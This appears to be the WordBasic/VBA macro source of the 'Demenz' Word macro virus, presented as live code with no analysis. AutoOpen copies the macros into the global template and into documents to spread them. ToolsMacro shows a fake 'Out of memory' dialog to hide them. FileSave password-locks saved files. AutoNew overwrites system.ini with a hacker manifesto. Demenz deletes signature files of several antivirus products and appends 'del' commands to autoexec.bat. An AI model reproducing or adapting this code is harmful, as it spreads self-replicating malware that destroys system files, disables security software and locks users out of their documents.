   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Dim b$
   Dim c$
   Dim x

   b$ = "Out of memory."
   c$ = "WordBasic Err = 7"
   ReDim ComboBox1__$(0)
   ComboBox1__$(0) = ""
   ReDim ListBox1__$(0)
   ListBox1__$(0) = ""
   ReDim DropListBox2__$(0)
   DropListBox2__$(0) = "Normal.dot(Global Template)"


   a:
   WordBasic.BeginDialog 442, 320, "Macro"
    WordBasic.CancelButton 290, 38, 141, 21
     WordBasic.PushButton 290, 14, 141, 21, "Rec&ord...", "D2"


     WordBasic.PushButton 290, 72, 141, 21, "&Run", "D3"
    WordBasic.PushButton 290, 97, 141, 21, "&Cancel", "D4"
    WordBasic.PushButton 290, 125, 141, 21, "&Delete", "D5"
    WordBasic.PushButton 290, 161, 141, 21, "Or&ganizer...", "D6"
    WordBasic.ComboBox 7, 23, 269, 194, ComboBox1__$(), "ComboBox1"

     WordBasic.Text 6, 223, 93, 13, "Macros &Available In:", "T1"
     WordBasic.Text 7, 259, 109, 13, "Description:", "T2"
     WordBasic.Text 7, 7, 93, 13, "&Macro Name:", "T3"
    WordBasic.ListBox 7, 276, 425, 38, ListBox1__$(), "LB1"

    WordBasic.DropListBox 6, 238, 425, 19, DropListBox2__$(), "LB2"

   WordBasic.EndDialog

   Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
    x = WordBasic.Dialog.UserDialog(dlg)
   Select Case x
    Case 0
     WordBasic.Cancel
    Case 1
     WordBasic.MsgBox b$, c$, 48
     GoTo a
    Case 2
     WordBasic.MsgBox b$, c$, 48
     GoTo a
    Case 3
     WordBasic.MsgBox b$, c$, 48
     GoTo a
    Case 4
     WordBasic.MsgBox b$, c$, 48
     GoTo a
    Case 5
     WordBasic.MsgBox b$, c$, 48
     GoTo a
    End Select
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   WordBasic.FileSave
   On Error Resume Next
   WordBasic.FileSaveAs Password:="Concetta"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim n$
   Dim f$
   Dim a
   Dim b
   Dim c
   Dim aa
   Dim bb
   Dim cc
   Dim fm$
   On Error Resume Next
   n$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
   f$ = WordBasic.[FileName$]()
   If GetAttr(n$) < 32 Then GoTo del
   a = WordBasic.CountMacros(0)
   If a > 0 Then
       For b = 1 To a
           If WordBasic.[MacroName$](b, 0) = "AutoOpen" Then c = 1
       Next b
   End If

   If c <> 1 Then
   WordBasic.Organizer Copy:=1, Source:=f$, Destination:=n$, Name:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=f$, Destination:=n$, Name:="AutoNew", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=f$, Destination:=n$, Name:="Demenz", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=f$, Destination:=n$, Name:="FileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=f$, Destination:=n$, Name:="ToolsMacro", Tab:=3

   End If

   aa = WordBasic.CountMacros(1)
   If aa > 0 Then
       For bb = 1 To aa
           If WordBasic.[MacroName$](bb, 1) = "AutoOpen" Then cc = 1
       Next bb
   End If

   If cc <> 1 Then
       WordBasic.FileSaveAs Format:=1
       fm$ = WordBasic.[FileName$]() + ":AutoOpen"
       WordBasic.MacroCopy "AutoOpen", fm$
       fm$ = WordBasic.[FileName$]() + ":AutoNew"
       WordBasic.MacroCopy "AutoNew", fm$
       fm$ = WordBasic.[FileName$]() + ":Demenz"
       WordBasic.MacroCopy "Demenz", fm$
       fm$ = WordBasic.[FileName$]() + ":FileSave"
       WordBasic.MacroCopy "FileSave", fm$
       fm$ = WordBasic.[FileName$]() + ":ToolsMacro"
       WordBasic.MacroCopy "ToolsMacro", fm$
   End If
   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   SetAttr "C:\Windows\system.ini", 0
       Open "C:\Windows\system.ini" For Output As 1
       Print #1, "[*****************************]"
       Print #1, "[***The Hacker´s Manifesto ***]"
       Print #1, "[*****************************]"
       Print #1, "[]"
       Print #1, "[]"
       Print #1, "[This is our world now ...]"
       Print #1, "[the world of the electron and the switch,]"
       Print #1, "[the beaty of the baud. We make use of a servive already]"
       Print #1, "[existing without paying for what could be dirt-cheap]"
       Print #1, "[if it wasn´t run by profiteering gluttons, and you]"
       Print #1, "[callus criminals. We explore... and YOU call us]"
       Print #1, "[criminals. We seek after knowledge... and YOU,]"
       Print #1, "[call us criminals. We exist without skin color]"
       Print #1, "[without nationality, without religious bias...]"
       Print #1, "[and YOU call us criminals.]"
       Print #1, "[YOU build atomic bombs, YOU wage wars, YOU murder,]"
       Print #1, "[cheat, and let lie to us and try to make us belive it´s]"
       Print #1, "[for OUR OWN GOOD, yet we´re the criminals.]"
       Print #1, "[]"
       Print #1, "[]"
       Print #1, "[Yes I´m a criminal. My crime is that of coriosity.]"
       Print #1, "[My crime is that of judging people by what they say]"
       Print #1, "[and think, not what they look like. My crime is that]"
       Print #1, "[of outsmarting YOU, something that YOU will never]"
       Print #1, "[forgive me for.]"
       Print #1, "[]"
       Print #1, "[]"
       Print #1, "[I am a hacker, and this is my manifesto.]"
       Print #1, "[YOU may stop this individual, but YOU can´t stop us ALL]"
       Print #1, "[]"
       Print #1, "[]"
       Print #1, "[]"
       Print #1, "[Serialkiller present´s]"
       Print #1, "[]"
       Print #1, "[THE Demenz virus]"
       Print #1, "[Greetings to all membaz aff the Codebreakers]"
       Close 1

   Finish:
   End Sub

   Attribute VB_Name = "Demenz"

   Public Sub MAIN()
   Dim SE1$
   Dim t1$
   Dim t2$
   Dim t3$
   Dim SE2$
   Dim SE3$
   Dim SE4$
   Dim SE5$
   Dim SE6$
   Dim SE7$
   Dim SE8$
   Dim SE9$
   Dim SE10$
   Dim SE11$
   Dim SE12$
   On Error Resume Next
   SE1$ = WordBasic.[Files$]("C:\PC-Cillin 95\Scan32.dll")
   If SE1$ = "" Then GoTo AV2
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
   Print #1, "del c:\pc-cil~1\*.dll >nul"
   Close 1
   WordBasic.Kill "C:\PC-Cillin 95\Lpt$vpn.*"
   WordBasic.MsgBox t1$ + "PC-CILLIN 95" + t2$, t3$, 48

   AV2:
   SE2$ = WordBasic.[Files$]("C:\PC-Cillin 97\Scan32.dll")
   If SE2$ = "" Then GoTo AV3
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
   Print #1, "del c:\pc-cil~1\*.dll >nul"
   Close 1
   WordBasic.Kill "C:\PC-Cillin 97\Lpt$vpn.*"
   WordBasic.MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48

   AV3:
   SE3$ = WordBasic.[Files$]("C:\Tsc\PC-Cillin 97\Scan32.dll")
   If SE3$ = "" Then GoTo AV4
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\tsc\pc-cil~1\*.* >nul"
   Print #1, "del c:\tsc\pc-cil~1\*.dll >nul"
   Close 1
   WordBasic.Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
   WordBasic.MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48

   AV4:
   SE4$ = WordBasic.[Files$]("C:\Zlockav\Gsav.dat")
   If SE4$ = "" Then GoTo AV5
   WordBasic.Kill SE4$
   WordBasic.Kill "C:\Zlockav\Gsav.cas"

   AV5:
   SE5$ = WordBasic.[Files$]("C:\VB7\Virus.txt")
   If SE5$ = "" Then GoTo AV6
   WordBasic.Kill SE5$

   AV6:
   SE6$ = WordBasic.[Files$]("C:\Program Files\Norton AntiVirus\Viruscan.dat")
   If SE6$ = "" Then GoTo AV7
   WordBasic.Kill SE6$
   WordBasic.Kill "C:\Program Files\Symantec\Symevnt.386"

   AV7:
   SE7$ = WordBasic.[Files$]("C:\Program Files\McAfee\VirusScan95\Scan.dat")
   If SE7$ = "" Then GoTo AV8
   WordBasic.Kill SE7$
   WordBasic.Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"

   AV8:
   SE8$ = WordBasic.[Files$]("C:\Program Files\McAfee\VirusScan\Scan.dat")
   If SE8$ = "" Then GoTo AV9
   WordBasic.Kill SE8$
   WordBasic.Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"

   AV9:
   SE9$ = WordBasic.[Files$]("C:\Program Files\Command Software\F-PROT95\Sign.def")
   If SE9$ = "" Then GoTo AV10
   WordBasic.Kill SE9$
   WordBasic.Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"

   AV10:
   SE10$ = WordBasic.[Files$]("C:\Program Files\AntiViral Toolkit Pro\Avp32.exe")
   If SE10$ = "" Then GoTo AV11
   WordBasic.Kill SE10$
   WordBasic.Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"

   AV11:
   SE11$ = WordBasic.[Files$]("C:\TBAVW95\Tbscan.sig")
   If SE11$ = "" Then GoTo joke
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\Tbavw95\*.* >nul"
   Print #1, "del c:\Tbavw95\Tb*.* >nul"
   Close 1
   WordBasic.Kill "C:\Tbavw95\Tbavw95.vxd"

   joke:
   SE12$ = WordBasic.[Files$]("C:\Programme\Norton AntiVirus\*.dat")
   If SE12$ = "" Then GoTo exit_
   SetAttr "c:\autoexec.bat", 0
   Open "c:\autoexec.bat" For Append As 1
   Print #1, "@echo off"
   Print #1, "attrib -h -r -s +a c:\Programme Norton AntiVirus\*.* >nul"
   Print #1, "del c:\Norton AntiVirus\*.* >nul"
   Close 1
   WordBasic.Kill "C:\Programme\Norton AntiVirus\*.dat"
   WordBasic.Kill "C:\Programme\Symantec\Symevnt.386"
   exit_:
   End Sub
